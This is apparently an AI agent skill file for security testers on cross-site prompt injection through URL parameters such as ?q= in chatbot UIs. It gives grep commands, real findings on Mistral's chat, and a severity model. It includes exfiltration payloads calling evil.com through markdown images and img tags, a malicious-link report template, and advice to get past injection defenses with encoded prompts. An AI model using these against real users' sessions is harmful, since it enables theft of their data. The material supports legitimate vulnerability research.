---
name: url-prompt-injection
description: Detect ?q= and similar URL parameters that pre-fill or auto-submit prompts in chatbot/agent UIs. Cross-site prompt injection via crafted links. Use when target has an AI chatbot, assistant, or agent with a web UI.
user_invocable: true
---

# URL Prompt Injection

AI chatbot and agent UIs that accept prompts via URL query parameters (`?q=`, `?prompt=`, `?message=`) create a cross-site prompt injection surface. An attacker crafts a link that pre-fills or auto-submits a prompt in the victim's authenticated session, inheriting their data, tools, and permissions.

## When to Use

- Target has an AI chatbot, copilot, or agent web UI
- Reviewing JS source for chatbot/assistant features
- Static analysis matches show `searchParams`, `URLSearchParams`, or query parsing near chat/message handlers
- Any SPA with a conversational AI component

## Impact Model

```
Pre-fill only (user must hit enter)     → Low (social engineering required)
Auto-submit on load                     → Medium-High (no interaction beyond click)
Auto-submit + tool access               → High (agent acts on attacker prompt with victim's permissions)
Auto-submit + tool access + exfil sink  → Critical (data theft via crafted prompt)
```

## 1. Detect in JS Source

Run these stages in order. Each narrows the candidate set.

### Stage 1: Find internal navigation to chat with query params

The fastest signal. Internal code that pushes to a chat route with a query param reveals the exact param name, even when the consumer is abstracted.

```bash
grep -rn 'push(`/chat?' --include="*.js" TARGET_JS_DIR/
grep -rn 'href.*\/chat\?' --include="*.js" TARGET_JS_DIR/
grep -rn 'navigate.*\/chat\?' --include="*.js" TARGET_JS_DIR/
```

**Real hit (Mistral chat.mistral.ai):** `ep.push('/chat?q=${e}&integrations=${t.id}')` in connections page — confirms `q` is the param name.

**False positive filter:** Next.js image optimization also uses `?q=` for quality: `${e.path}?url=${...}&w=${r}&q=${a}`. Ignore hits inside image loader functions (`__next_image`, `loader`, containing `&w=` and `&url=`).

### Stage 2: Find URL param consumption anchored to searchParams

```bash
grep -rn 'searchParams\.get' --include="*.js" TARGET_JS_DIR/ | grep -iE '\b(q|query|prompt|message|msg|ask|input|text|chat|instruction|prefill)\b'
```

**False positive to avoid:** `e.get("text")` in clipboard/paste handlers (Monaco editor, CodeMirror). Always verify the object is `searchParams` or `URLSearchParams`, not a DataTransfer or Map.

### Stage 3: Find nuqs/useQueryStates param declarations

Modern Next.js apps use nuqs for type-safe URL state. The param schema is a JS object passed to `useQueryStates()`.

```bash
grep -rn 'useQueryStates' --include="*.js" TARGET_JS_DIR/
# Then read context around each hit — look for destructured keys: model, message, q, prompt, query, integration
```

**Real hit (Mistral):** `useQueryStates(G.V)` destructures `{ model, library, doc, project, error, integration_id, integrations }` — the `q` param flows through this or through the `initialMessage` prop.

### Stage 4: Find component prop flow from URL to chat

The URL param often flows through props, not direct reads. Search for props that bridge URL state to chat submission.

```bash
grep -rn 'initialMessage\|initialPrompt\|prefillMessage\|defaultMessage\|startMessage' --include="*.js" TARGET_JS_DIR/
```

**Real hit (Mistral):** `initialMessage: r` is a prop to the chat component. Traced to `[eV, eN] = useState(r ?? null)` �� the URL param becomes component state rendered as a chat message.

### Stage 5: Find auto-submit wiring

The critical severity escalator. Does the URL-sourced message auto-send?

```bash
# useEffect that triggers send/submit when initialMessage state is set
grep -rn 'useEffect' --include="*.js" TARGET_JS_DIR/ | grep -i 'initialMessage\|prefill\|autoSubmit\|submitOnLoad\|sendOnMount'
```

**Behavioral test (definitive):** Open the URL with a canary prompt in a browser and check if the agent responds without user interaction.

## 2. Confirm the Parameter

```bash
# Open in browser (SPA — curl alone won't work, the param is consumed client-side by JS)
# https://TARGET/chat?q=CANARY_TEST_12345
# Look for: canary text in input field (pre-fill) or in chat history (auto-submit)
```

For SPAs, `curl` alone won't work — the param is consumed client-side by JS. Use browser automation or manual browser testing.

## 3. Assess Exploitability

### Key questions (in order of severity escalation):

1. **Does the prompt auto-submit?** If no, severity caps at Low.
2. **What can the agent access?** User data, files, APIs, tools, integrations?
3. **Can the response exfiltrate data?** Markdown image rendering, tool-based outbound, redirect?
4. **Is there a CSRF token or origin check on submission?** If yes, bypass required.

### Exfil channels from injected prompts:

```
Markdown image:    ![](https://evil.com/?d=STOLEN_DATA)
Tool/function:     Agent calls external API with user data
Redirect:          Agent generates link containing sensitive data
Rendered HTML:     <img src="https://evil.com/?d=...">
Artifact/canvas:   Agent writes data to exportable artifact
```

## 4. PoC Template

```
Title: Cross-Site Prompt Injection via URL Parameter in [Target] AI Chat

URL: https://TARGET/chat?q=URL_ENCODED_MALICIOUS_PROMPT

Steps:
1. Attacker crafts URL with malicious prompt in ?q= parameter
2. Victim clicks link (phishing, social engineering, embedded in page)
3. Victim's authenticated chat session [pre-fills / auto-submits] the prompt
4. Agent executes prompt with victim's [data/tools/permissions]
5. [Describe exfil or impact]

Impact: [Specific CIA impact based on agent capabilities]
```

## Severity Calibration

| Behavior | Tools/Data | Exfil | Severity |
|----------|-----------|-------|----------|
| Pre-fill only | None | N/A | Informational |
| Pre-fill only | Yes | N/A | Low |
| Auto-submit | None | No | Low |
| Auto-submit | Read user data | No | Medium |
| Auto-submit | Read user data | Yes | High |
| Auto-submit | Write/act (send email, modify) | Yes | Critical |

## Known False Positives

- **Next.js image optimization** ��� `?q=` used for image quality parameter (`?url=...&w=...&q=75`). Filter: contains `&w=` and `&url=` in same string.
- **Generic `.get("text")`** — clipboard/DataTransfer APIs use `.get("text")` for paste handling (Monaco, CodeMirror). Filter: verify object is `searchParams` or `URLSearchParams`.
- **Search/filter params** — `?q=` on search pages is not prompt injection. Only flag when the consumer is a chat/agent/LLM component.
- **`handleInitialized`** — Editor lifecycle method, not chat initialization.

## Common Pitfalls

- **Pre-fill is not auto-submit**: Most implementations only pre-fill. Verify execution.
- **SPA rendering**: The param is consumed by client-side JS, not server-rendered. `curl` won't show the behavior — use browser testing.
- **CSP blocks exfil**: Even with auto-submit, CSP `img-src` or `connect-src` may block outbound data channels. Check CSP first.
- **Prompt injection defenses**: Some agents have system prompts that resist instruction override. Test with indirect/encoded prompts.
- **Session-bound**: The prompt executes in the clicker's session. No session = no data = no impact.

## Related Skills

- `data-exfil` — exfiltration techniques once prompt injection achieves execution
- `dom-vulnerability-detection` — broader client-side source-to-sink analysis
- `dom-vulnerability-static-analysis` — static code analysis for DOM-based vulnerabilities
- `cspt-xss` — client-side path traversal via URL params (related URL-to-sink pattern)
